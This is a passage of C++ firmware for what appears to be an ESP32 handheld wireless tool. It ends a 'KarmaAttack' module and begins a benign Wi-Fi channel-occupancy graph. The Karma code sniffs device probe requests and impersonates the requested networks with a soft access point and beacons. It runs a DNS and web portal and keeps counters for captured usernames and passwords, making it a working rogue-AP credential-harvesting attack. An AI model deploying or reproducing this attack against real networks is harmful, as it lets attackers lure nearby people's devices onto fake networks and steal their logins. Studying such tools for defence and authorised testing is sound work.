  tft.setTextColor(s_termColor[index], TFT_BLACK);
  tft.setCursor(CARD_MARGIN, y);
  tft.print(s_term[index]);
}

static void redrawTerm() {
  const int cap = termVisibleLines();
  const int bodyBottom = wifiContentBottom();
  // Clear log zone once, then paint lines (avoids per-line gap flicker).
  const int h = bodyBottom - TERM_TOP_Y;
  if (h > 0) {
    tft.fillRect(0, TERM_TOP_Y, SCREEN_WIDTH, h, TFT_BLACK);
  }
  for (int i = 0; i < s_termLines && i < cap; i++) {
    const int y = TERM_TOP_Y + i * LINE_HEIGHT;
    if (y + LINE_HEIGHT > bodyBottom) {
      break;
    }
    tft.setTextColor(s_termColor[i], TFT_BLACK);
    tft.setCursor(CARD_MARGIN, y);
    tft.print(s_term[i]);
  }
}

static void logLine(const String& text, uint16_t color) {
  if (!feature_active) {
    return;
  }
  const int cap = termVisibleLines();
  bool scrolled = false;
  if (s_termLines >= cap) {
    scrollTerm();
    s_termLines = cap - 1;
    scrolled = true;
  }
  s_term[s_termLines] = text;
  s_termColor[s_termLines] = color;
  s_termLines++;
  if (scrolled) {
    redrawTerm();
  } else {
    paintTermLine(s_termLines - 1);
  }
}

static void flushPendingLog() {
  if (!s_logPending) {
    return;
  }
  s_logPending = false;
  logLine(String(s_pendingLog), s_pendingLogColor);
}

static void updateHeader(bool force) {
  if (force) {
    invalidateHeaderCache();
  }
  tickBeaconRate();

  // Draw static chrome once. Never wipe this region on later force refreshes.
  if (!s_chromeDrawn) {
    tft.fillRect(0, CARDS_Y, SCREEN_WIDTH, TERM_TOP_Y - CARDS_Y, TFT_BLACK);
    drawStatCardsChrome();
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(CARD_MARGIN, ACT_LABEL_Y);
    tft.print("ACTIVITY");
    tft.drawFastHLine(68, ACT_LABEL_Y + 4, SCREEN_WIDTH - CARD_MARGIN - 68, UI_LINE);
    s_chromeDrawn = true;
  }

  char v0[10];
  char v1[10];
  char v2[10];
  const uint8_t clients = (uint8_t)WiFi.softAPgetStationNum();
  snprintf(v0, sizeof(v0), "%d", s_count);
  snprintf(v1, sizeof(v1), "%u", (unsigned)(s_running ? s_beaconRate : 0));
  snprintf(v2, sizeof(v2), "%u", (unsigned)clients);
  paintStatCardValue(0, v0, s_count > 0 ? WHITE : UI_DIM_TEXT);
  paintStatCardValue(1, v1, (s_running && s_beaconRate > 0) ? ORANGE : UI_DIM_TEXT);
  paintStatCardValue(2, v2, clients > 0 ? GREEN : UI_DIM_TEXT);

  // Keep AP/status text stable — no live probe counters (those caused flicker).
  char apLine[52];
  uint16_t apColor = UI_DIM_TEXT;
  if (s_apSsid[0] && s_running) {
    const bool placeholder = (strcmp(s_apSsid, "Karma") == 0 && s_count == 0);
    if (placeholder) {
      snprintf(apLine, sizeof(apLine), "Waiting for probes...");
      apColor = UI_DIM_TEXT;
    } else {
      char ssidShort[22];
      truncSsid(ssidShort, sizeof(ssidShort), s_apSsid, 18);
      snprintf(apLine, sizeof(apLine), "AP: %s", ssidShort);
      apColor = FEATURE_TEXT;
    }
  } else if (s_running) {
    snprintf(apLine, sizeof(apLine), "Listening for probes...");
    apColor = UI_TEXT;
  } else if (s_count > 0) {
    snprintf(apLine, sizeof(apLine), "Ready - press Start");
    apColor = UI_TEXT;
  } else {
    snprintf(apLine, sizeof(apLine), "No SSIDs - Start or Add");
    apColor = UI_DIM_TEXT;
  }
  paintInfoRow(AP_Y, s_hdrCacheAp, sizeof(s_hdrCacheAp), apLine, apColor,
               SCREEN_WIDTH - CARD_MARGIN * 2);

  char topLine[52];
  uint16_t topColor = UI_DIM_TEXT;
  int wantBars = -1;
  ProbeSsid best;
  if (bestSsidSnapshot(best)) {
    char ssidShort[20];
    truncSsid(ssidShort, sizeof(ssidShort), best.ssid, 16);
    snprintf(topLine, sizeof(topLine), "Top: %s", ssidShort);
    topColor = s_running ? ORANGE : UI_TEXT;
    wantBars = rssiBars(best.rssi);
  } else if (s_running) {
    snprintf(topLine, sizeof(topLine), "Top: waiting...");
  } else {
    snprintf(topLine, sizeof(topLine), "Add = seed a test SSID");
  }

  // Full-row clear keeps AP / Top from stacking when text changes.
  const bool topChanged = paintInfoRow(TOP_Y, s_hdrCacheTop, sizeof(s_hdrCacheTop),
                                       topLine, topColor,
                                       SCREEN_WIDTH - CARD_MARGIN - BAR_ZONE_W);
  if (force || topChanged) {
    s_barsCache = -2;
  }
  if (wantBars != s_barsCache) {
    const int barX = SCREEN_WIDTH - BAR_ZONE_W + 2;
    // Row already cleared when text changed; only clear bar zone on bar-only updates.
    if (!topChanged) {
      tft.fillRect(barX, TOP_Y, BAR_ZONE_W - 2, INFO_ROW_H, TFT_BLACK);
    }
    if (wantBars >= 0) {
      drawSignalBars(barX, TOP_Y + 12, wantBars);
    }
    s_barsCache = wantBars;
  }

  s_headerDirty = false;
}

static void drawDashboard(bool full) {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  if (full) {
    wifiClearBody(TFT_BLACK);
    invalidateHeaderCache();
    s_chromeDrawn = false;
  }
  updateHeader(true);
  if (full) {
    redrawTerm();
  }
  updateNavLabels(true);
}

static void resetBeaconStats() {
  s_beaconsSent = 0;
  s_beaconRate = 0;
  s_beaconsAtMark = 0;
  s_rateMarkMs = millis();
}

static void clearLearned() {
  portENTER_CRITICAL(&s_mux);
  s_count = 0;
  portEXIT_CRITICAL(&s_mux);
  s_beaconIdx = 0;
  s_activeApIndex = -1;
  resetBeaconStats();
  s_probeFrames = 0;
  s_namedProbes = 0;
  s_apSsid[0] = '\0';
  logLine("[*] Cleared learned SSIDs", UI_WARN);
  s_headerDirty = true;
  updateHeader(true);
}

static void stopKarma() {
  const bool wasRunning = s_running;
  s_running = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  stopPortal();
  WiFi.softAPdisconnect(true);
  s_activeApIndex = -1;
  s_apSsid[0] = '\0';
  s_headerDirty = true;
  if (wasRunning) {
    logLine("[*] Stopped", UI_WARN);
  }
  updateHeader(true);
  updateNavLabels(true);
}

static void startKarma() {
  if (s_running) {
    stopKarma();
  } else {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    stopPortal();
    WiFi.softAPdisconnect(true);
  }

  WiFi.mode(WIFI_AP);
  delay(40);
  // Placeholder AP until a probed SSID is learned.
  WiFi.softAP("Karma", nullptr, s_channel);
  delay(40);
  strncpy(s_apSsid, "Karma", sizeof(s_apSsid) - 1);
  s_apSsid[sizeof(s_apSsid) - 1] = '\0';

  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);

  ensurePortal();

  s_running = true;
  s_lastHopMs = millis();
  s_lastApSwitchMs = 0;
  s_lastBeaconMs = 0;
  resetBeaconStats();
  s_headerDirty = true;

  logLine("[+] LIVE - answering probes", GREEN);
  if (s_count > 0) {
    maybeSwitchAp();
  } else {
    logLine("[*] Waiting for probes...", UI_DIM_TEXT);
  }
  updateHeader(true);
  updateNavLabels(true);
}

static void promptAddSsid() {
  const bool wasRunning = s_running;
  if (wasRunning) {
    // Keep radio up but pause UI takeover.
  }

  OnScreenKeyboardConfig cfg;
  cfg.titleLine1 = "[!] Seed SSID for Karma";
  cfg.titleLine2 = "Learned list + beacons (Shuffle ok)";
  osKeyboardUseStandardLayout(cfg);
  cfg.maxLen = 31;
  cfg.shuffleNames = kTestSsids;
  cfg.shuffleCount = kTestSsidCount;
  cfg.buttonsY = 195;
  cfg.backLabel = "Back";
  cfg.middleLabel = "Shuffle";
  cfg.okLabel = "OK";
  cfg.enableShuffle = true;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg = "SSID cannot be empty!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "TestKarma");
  s_uiDrawn = false;

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  drawDashboard(true);

  if (r.accepted && r.text.length() > 0) {
    recordProbeSsid(r.text.c_str(), -40, s_channel);
    flushPendingLog();
    char buf[48];
    snprintf(buf, sizeof(buf), "[+] seeded %s", r.text.c_str());
    logLine(buf, GREEN);
    if (wasRunning || s_running) {
      s_lastApSwitchMs = 0;
      maybeSwitchAp();
    } else {
      logLine("[*] Press Start to beacon/answer", UI_TEXT);
    }
    s_headerDirty = true;
    updateHeader();
  } else {
    logLine("[*] Add cancelled", UI_DIM_TEXT);
  }
  updateNavLabels();
}

static void handleNavButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    (void)isButtonPressedEdge(BTN_SELECT);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    feature_exit_requested = true;
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    clearLearned();
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    promptAddSsid();
    s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_running) {
      stopKarma();
    } else {
      startKarma();
    }
    s_lastBtnMs = now;
    return;
  }
}

static void runUI() {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_undo,
      bitmap_icon_go_back};

  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;
    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        clearLearned();
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void teardown() {
  stopKarma();
  WiFi.mode(WIFI_OFF);
  delay(20);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
}

void karmaSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  s_uiDrawn = false;
  s_running = false;
  s_count = 0;
  s_termLines = 0;
  s_probeFrames = 0;
  s_namedProbes = 0;
  s_credCount = 0;
  s_lastUser[0] = '\0';
  s_lastPass[0] = '\0';
  s_apSsid[0] = '\0';
  s_activeApIndex = -1;
  s_channel = 6;
  s_logPending = false;
  s_headerDirty = true;
  s_lastClients = 0;
  s_navDrawn = false;
  s_chromeDrawn = false;
  resetBeaconStats();
  invalidateHeaderCache();

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();

  drawDashboard(true);
  logLine("[*] Answers probe SSIDs", UI_TEXT);
  logLine("[*] Start, or Add to seed", UI_DIM_TEXT);
}

void karmaLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }

  handleNavButtons();
  flushPendingLog();
  hopIfNeeded();
  updateStatusBar();
  runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    teardown();
    return;
  }

  if (s_running) {
    maybeSwitchAp();
    sendNextBeacon();
    if (s_portalUp) {
      s_dns.processNextRequest();
      s_server.handleClient();
    }

    const uint8_t clients = (uint8_t)WiFi.softAPgetStationNum();
    if (clients != s_lastClients) {
      if (clients > s_lastClients) {
        logLine("[!] Client joined", ORANGE);
      } else {
        logLine("[*] Client left", UI_DIM_TEXT);
      }
      s_lastClients = clients;
      s_headerDirty = true;
    }
  }

  const uint32_t now = millis();
  if (s_headerDirty || now - s_lastStatsMs > STATS_MS) {
    updateHeader(false);
    s_lastStatsMs = now;
  }
}

}  // namespace KarmaAttack


namespace ChannelGraph {

// Live 2.4GHz channel-occupancy graph (WiFi Analyzer style), built entirely
// from data the scan already returns: SSID, RSSI, channel, BSSID, auth mode.
// The ESP32-S3 radio is 2.4GHz only, so this covers channels 1-13 and never
// shows a 5GHz tab.

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16

static constexpr int MAX_NETS = ESP32DIV_MAX_WIFI_NETWORKS;

// Graph geometry. kWifiBodyTop (file-scope, see top of this file) is where
// every WiFi feature's body starts, right below the shared status bar.
static constexpr int GRAPH_X_LEFT  = 30;
static constexpr int GRAPH_X_RIGHT = 234;
static constexpr int DETAIL_STRIP_H = 16;
// Row for the "1 2 3 ... 13" channel numbers under the plot, kept separate
// from the detail strip below it so the two never overdraw each other.
static constexpr int CHANNEL_LABEL_H = 10;
static constexpr int AXIS_GAP = 2;
static constexpr int RSSI_TOP_DBM = -30;
static constexpr int RSSI_BOT_DBM = -90;

struct CgNet {
  char ssid[20];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  wifi_auth_mode_t authmode;
  uint8_t colorIdx;
};

static CgNet s_nets[MAX_NETS];
static int s_count = 0;

static bool s_hasSelection = false;
static uint8_t s_selectedBssid[6] = {0};

static bool s_scanning = false;
static bool s_asyncScanActive = false;
static bool s_needRedraw = true;
static bool s_uiDrawn = false;
static int s_scanAnimFrame = 0;
static unsigned long s_lastScanAnimMs = 0;
static unsigned long s_lastAutoScanMs = 0;
static const unsigned long AUTO_RESCAN_MS = 15000;

// Fixed, visually distinct palette. A network's color is picked from a hash
// of its BSSID, so the same AP keeps the same color across rescans instead
// of jumping around as scan order changes.
static const uint16_t kPalette[] = {
  0x07FF,  // cyan
  0xFFE0,  // yellow
  0xF81F,  // magenta
  0xFD20,  // orange
  0x87FF,  // light blue
  0x07E0,  // green
  0xF800,  // red
  0xFBB6,  // light pink
};
static constexpr int kPaletteSize = sizeof(kPalette) / sizeof(kPalette[0]);

static uint8_t colorIndexForBssid(const uint8_t bssid[6]) {
  uint16_t h = 0;
  for (int i = 0; i < 6; i++) {
    h = (uint16_t)((h * 131) ^ bssid[i]);
  }
  return (uint8_t)(h % kPaletteSize);
}

// A few extra pixels of breathing room below the header row.
static int graphTop() { return kWifiBodyTop + 6; }
static int graphBottomFull() { return wifiListBottomY(); }
static int detailStripY() { return graphBottomFull() - DETAIL_STRIP_H; }
static int channelLabelY() { return detailStripY() - CHANNEL_LABEL_H; }
static int graphBottom() { return channelLabelY() - AXIS_GAP; }

static float xForCh(float ch) {
  return GRAPH_X_LEFT + (ch - 1.0f) * (float)(GRAPH_X_RIGHT - GRAPH_X_LEFT) / 12.0f;
}

static float chAtX(int x) {
  return 1.0f + (float)(x - GRAPH_X_LEFT) * 12.0f / (float)(GRAPH_X_RIGHT - GRAPH_X_LEFT);
}

static int yForRssi(int rssi) {
  const int r = constrain(rssi, RSSI_BOT_DBM, RSSI_TOP_DBM);
  // Qualified as ::map — unqualified `map` is ambiguous here because <map>
  // (pulled in transitively via NimBLE headers) also brings std::map into scope.
  return ::map(r, RSSI_BOT_DBM, RSSI_TOP_DBM, graphBottom(), graphTop());
}

static const char* authShort(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA*";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3*";
    default: return "?";
  }
}

// Among {1, 6, 11}: lower score = less overlap from neighboring networks.
// Linear weight decaying to 0 over 5 channels of distance, times each
// network's linear (not dBm) power so strong-but-distant APs still count.
static int suggestedChannel() {
  static const int kCandidates[3] = {1, 6, 11};
  int best = kCandidates[0];
  double bestScore = 1e18;
  for (int ci = 0; ci < 3; ci++) {
    const int c = kCandidates[ci];
    double score = 0.0;
    for (int i = 0; i < s_count; i++) {
      const double dist = fabs((double)c - (double)s_nets[i].channel);
      const double w = 1.0 - dist / 5.0;
      if (w <= 0.0) continue;
      score += w * pow(10.0, (double)s_nets[i].rssi / 10.0);
    }
    if (score < bestScore) {
      bestScore = score;
      best = c;
    }
  }
  return best;
}

static int findSelectedIndex() {
  if (!s_hasSelection) return -1;
  for (int i = 0; i < s_count; i++) {
    if (memcmp(s_nets[i].bssid, s_selectedBssid, 6) == 0) return i;
  }
  return -1;
}

static int findConnectedIndex() {
  if (WiFi.status() != WL_CONNECTED) return -1;
  const uint8_t* bssid = WiFi.BSSID();
  if (!bssid) return -1;
  for (int i = 0; i < s_count; i++) {
    if (memcmp(s_nets[i].bssid, bssid, 6) == 0) return i;
  }
  return -1;
}

static void populateFromScan(int n) {
  s_count = min(n, MAX_NETS);
  for (int i = 0; i < s_count; i++) {
    CgNet& e = s_nets[i];
    String ssid = WiFi.SSID(i);
    strncpy(e.ssid, ssid.c_str(), sizeof(e.ssid) - 1);
    e.ssid[sizeof(e.ssid) - 1] = '\0';
    const uint8_t* b = WiFi.BSSID(i);
    if (b) {
      memcpy(e.bssid, b, 6);
    } else {
      memset(e.bssid, 0, 6);
    }
    e.rssi = (int8_t)constrain(WiFi.RSSI(i), -127, 0);
    e.channel = (uint8_t)constrain((int)WiFi.channel(i), 1, 13);
    e.authmode = WiFi.encryptionType(i);
    e.colorIdx = colorIndexForBssid(e.bssid);
  }
  s_needRedraw = true;
}

static void abortAsyncScanIfAny() {
  if (s_asyncScanActive) {
    (void)esp_wifi_scan_stop();
    WiFi.scanDelete();
    s_asyncScanActive = false;
  }
  s_scanning = false;
}

// Starts a background (async) scan and returns immediately — the UI keeps
// drawing a "scanning..." indicator while pollScan() checks for completion
// on every loop() tick instead of blocking here.
static void startScan() {
  pauseBackgroundRadioTasks();
  if (WifiScan::bgScanRunning) {
    WifiScan::stopBgWifiScanIfRunning();
  }
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.scanDelete();
  delay(20);
  const uint32_t dwell = wifiStaScanMsPerChannel();
  const int ret = WiFi.scanNetworks(true, true, false, dwell);
  s_scanning = true;
  s_scanAnimFrame = 0;
  s_lastScanAnimMs = millis();
  s_asyncScanActive = (ret == WIFI_SCAN_RUNNING);
  if (!s_asyncScanActive) {
    // Driver returned instantly (cached result) — consume it right away.
    if (ret >= 0) {
      populateFromScan(ret);
    }
    s_scanning = false;
  }
  s_lastAutoScanMs = millis();
}

static void pollScan() {
  if (!s_scanning || !s_asyncScanActive) return;
  const int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) return;
  s_asyncScanActive = false;
  s_scanning = false;
  if (n >= 0) {
    populateFromScan(n);
  }
  // WIFI_SCAN_FAILED: keep showing the last good results.
}

static void drawChannelMarkers() {
  static const int kMarked[3] = {1, 6, 11};
  const int top = graphTop();
  const int bot = graphBottom();
  for (int m = 0; m < 3; m++) {
    const int x = (int)xForCh((float)kMarked[m]);
    // TFT_eSPI has no native dashed line — draw it as short segments.
    for (int y = top; y < bot; y += 6) {
      tft.drawFastVLine(x, y, 3, TFT_CYAN);
    }
  }
}

static void drawAxes() {
  const int top = graphTop();
  const int bot = graphBottom();
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(UI_LINE, TFT_BLACK);
  for (int dbm = RSSI_TOP_DBM; dbm >= RSSI_BOT_DBM; dbm -= 10) {
    const int y = yForRssi(dbm);
    tft.drawFastHLine(GRAPH_X_LEFT, y, GRAPH_X_RIGHT - GRAPH_X_LEFT, UI_LINE);
    tft.setCursor(0, y - 3);
    tft.print(dbm);
  }
  tft.drawFastVLine(GRAPH_X_LEFT, top, bot - top, UI_LINE);

  const int chLabelY = channelLabelY();
  for (int ch = 1; ch <= 13; ch++) {
    const int x = (int)xForCh((float)ch);
    const bool highlight = (ch == 1 || ch == 6 || ch == 11);
    tft.setTextColor(highlight ? TFT_CYAN : UI_LINE, TFT_BLACK);
    tft.setCursor(x - (ch >= 10 ? 5 : 3), chLabelY);
    tft.print(ch);
  }
  drawChannelMarkers();
}

// Visualization-only convention: a ~20MHz-wide Gaussian lobe centered on the
// reported channel. The scan only gives us the center channel and RSSI — the
// ESP never measures the real occupied spectrum, so this width is just a
// readable stand-in for "roughly how wide a 2.4GHz channel is", not a
// measurement.
static constexpr float kSigmaChannels = 1.25f;

static int curveYAtX(int netIdx, int x) {
  const CgNet& e = s_nets[netIdx];
  const float yPeak = (float)yForRssi(e.rssi);
  const float chx = chAtX(x);
  const float d = chx - (float)e.channel;
  const float sigmaPx = kSigmaChannels;
  const float v = expf(-(d * d) / (2.0f * sigmaPx * sigmaPx));
  const float yBot = (float)graphBottom();
  return (int)lroundf(yBot - (yBot - yPeak) * v);
}

struct LabelBox { int16_t x, y, w, h; };
static LabelBox s_labelBoxes[MAX_NETS];
static int s_labelBoxCount = 0;

static bool boxesOverlap(const LabelBox& a, const LabelBox& b) {
  return !(a.x + a.w < b.x || b.x + b.w < a.x || a.y + a.h < b.y || b.y + b.h < a.y);
}

static void drawNetworkLabel(int netIdx, int peakX, int peakY, uint16_t color) {
  const CgNet& e = s_nets[netIdx];
  char label[20];
  if (e.ssid[0] == '\0') {
    snprintf(label, sizeof(label), "(hidden) %d", e.channel);
  } else {
    char ssidTrunc[11];
    strncpy(ssidTrunc, e.ssid, 10);
    ssidTrunc[10] = '\0';
    snprintf(label, sizeof(label), "%s %d", ssidTrunc, e.channel);
  }

  tft.setTextFont(1);
  tft.setTextSize(1);
  const int16_t w = (int16_t)tft.textWidth(label);
  const int16_t h = 9;
  int16_t x = (int16_t)constrain(peakX - w / 2, GRAPH_X_LEFT, GRAPH_X_RIGHT - w);
  int16_t y = (int16_t)(peakY - 10);

  // Anti-collision: stack the label higher until it clears every label
  // already placed this frame (clamped so it never leaves the graph area).
  LabelBox box = {x, y, w, h};
  bool moved = true;
  int guard = 0;
  while (moved && guard++ < 20) {
    moved = false;
    for (int i = 0; i < s_labelBoxCount; i++) {
      if (boxesOverlap(box, s_labelBoxes[i])) {
        box.y -= (h + 1);
        moved = true;
      }
    }
  }
  if (box.y < graphTop()) {
    box.y = graphTop();
  }
  if (s_labelBoxCount < MAX_NETS) {
    s_labelBoxes[s_labelBoxCount++] = box;
  }

  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(box.x, box.y);
  tft.print(label);
}

static void drawYouAreHereMarker(int netIdx) {
  const int x = (int)xForCh((float)s_nets[netIdx].channel);
  const int y = yForRssi(s_nets[netIdx].rssi);
  tft.fillTriangle(x - 4, y - 8, x + 4, y - 8, x, y - 2, TFT_WHITE);
}

static void drawNetworkCurve(int netIdx, bool selected, bool dimmed) {
  const CgNet& e = s_nets[netIdx];
  uint16_t color = kPalette[e.colorIdx];
  if (dimmed) {
    // Cheap "dim" without alpha blending: halve each channel's bits.
    color = (uint16_t)(((color >> 1) & 0x7BEF));
  }

  int prevY = curveYAtX(netIdx, GRAPH_X_LEFT);
  for (int x = GRAPH_X_LEFT + 1; x <= GRAPH_X_RIGHT; x++) {
    const int y = curveYAtX(netIdx, x);
    tft.drawLine(x - 1, prevY, x, y, color);
    if (selected) {
      // Slightly thicker outline for the selected curve.
      tft.drawLine(x - 1, prevY + 1, x, y + 1, color);
    }
    prevY = y;
  }

  const int peakX = (int)xForCh((float)e.channel);
  const int peakY = yForRssi(e.rssi);
  drawNetworkLabel(netIdx, peakX, peakY, color);
}

static void drawDetailStrip() {
  const int y = detailStripY();
  tft.fillRect(0, y, SCREEN_WIDTH, DETAIL_STRIP_H, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setCursor(4, y + 4);

  const int sel = findSelectedIndex();
  if (sel < 0) {
    tft.setTextColor(GREEN, TFT_BLACK);
    char buf[32];
    snprintf(buf, sizeof(buf), "Suggested: ch %d", suggestedChannel());
    tft.print(buf);
    return;
  }

  const CgNet& e = s_nets[sel];
  char buf[64];
  const char* ssid = (e.ssid[0] == '\0') ? "(hidden)" : e.ssid;
  snprintf(buf, sizeof(buf), "%s  ch%d  %ddBm  %s", ssid, e.channel, e.rssi, authShort(e.authmode));
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.print(buf);
}

static void drawHeaderRow() {
  tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, UI_FG);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT, UI_FG);
  tft.setCursor(4, STATUS_BAR_Y_OFFSET + 4);
  char buf[28];
  snprintf(buf, sizeof(buf), "Channel Graph  %d APs", s_count);
  tft.print(buf);

  tft.setTextColor(UI_ACCENT, UI_FG);
  const char* tag = "2.4G";
  const int w = tft.textWidth(tag);
  tft.setCursor(SCREEN_WIDTH - w - 4, STATUS_BAR_Y_OFFSET + 4);
  tft.print(tag);

  tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
}

static void drawScanningIndicator() {
  const unsigned long now = millis();
  if (now - s_lastScanAnimMs > 300) {
    s_scanAnimFrame = (s_scanAnimFrame + 1) % 4;
    s_lastScanAnimMs = now;

    char dots[8] = "";
    for (int i = 0; i < s_scanAnimFrame; i++) {
      dots[i] = '.';
    }
    dots[s_scanAnimFrame] = '\0';

    tft.fillRect(0, STATUS_BAR_Y_OFFSET, 140, STATUS_BAR_HEIGHT, UI_FG);
    tft.setTextFont(1);
    tft.setTextSize(1);
    tft.setTextColor(UI_WARN, UI_FG);
    tft.setCursor(4, STATUS_BAR_Y_OFFSET + 4);
    char buf[24];
    snprintf(buf, sizeof(buf), "Scanning%s", dots);
    tft.print(buf);
  }
}

static void drawGraph() {
  wifiClearBody(TFT_BLACK);
  drawAxes();

  if (s_count == 0) {
    tft.setTextFont(1);
    tft.setTextColor(UI_TEXT, TFT_BLACK);
    tft.setCursor(GRAPH_X_LEFT + 10, (graphTop() + graphBottom()) / 2);
    tft.print("No networks found.");
    drawDetailStrip();
    return;
  }

  // Draw order: weakest signal first, strongest on top (most readable).
  static int order[MAX_NETS];
  for (int i = 0; i < s_count; i++) order[i] = i;
  for (int i = 1; i < s_count; i++) {
    const int key = order[i];
    int j = i - 1;
    while (j >= 0 && s_nets[order[j]].rssi > s_nets[key].rssi) {
      order[j + 1] = order[j];
      j--;
    }
    order[j + 1] = key;
  }

  s_labelBoxCount = 0;
  const int sel = findSelectedIndex();
  for (int k = 0; k < s_count; k++) {
    const int idx = order[k];
    const bool selected = (idx == sel);
    const bool dimmed = s_hasSelection && !selected;
    drawNetworkCurve(idx, selected, dimmed);
  }

  const int connected = findConnectedIndex();
  if (connected >= 0) {
    drawYouAreHereMarker(connected);
  }

  drawDetailStrip();
}

static void handleTouchSelect(int tx, int ty) {
  if (ty < graphTop() || ty > graphBottom() || tx < GRAPH_X_LEFT || tx > GRAPH_X_RIGHT) {
    return;
  }
  int best = -1;
  int bestDist = 1000000;
  for (int i = 0; i < s_count; i++) {
    const int cy = curveYAtX(i, tx);
    const int d = abs(cy - ty);
    if (d < bestDist) {
      bestDist = d;
      best = i;
    }
  }
  static constexpr int kTapToleranceY = 14;
  if (best >= 0 && bestDist <= kTapToleranceY) {
    s_hasSelection = true;
    memcpy(s_selectedBssid, s_nets[best].bssid, 6);
  } else {
    s_hasSelection = false;
  }
  s_needRedraw = true;
}

static void handleTouch() {
  static unsigned long lastTouchMs = 0;
  const unsigned long now = millis();
  if (now - lastTouchMs < 120) return;

  int x, y;
  if (!feature_active || !readTouchXY(x, y)) return;
  // Stay out of the shared status bar and the touch nav bar at the bottom —
  // those have their own hit-testing (redrawTouchButtonBar/maintainTouchNavBar).
  if (y < kWifiBodyTop || y > detailStripY() + DETAIL_STRIP_H) return;

  lastTouchMs = now;
  if (y <= graphBottom()) {
    handleTouchSelect(x, y);
  } else {
    // Tap on the detail strip (not over a curve): clear selection.
    s_hasSelection = false;
    s_needRedraw = true;
  }
}

// Button layout for this feature: UP/DOWN/RIGHT are unused, LEFT exits back
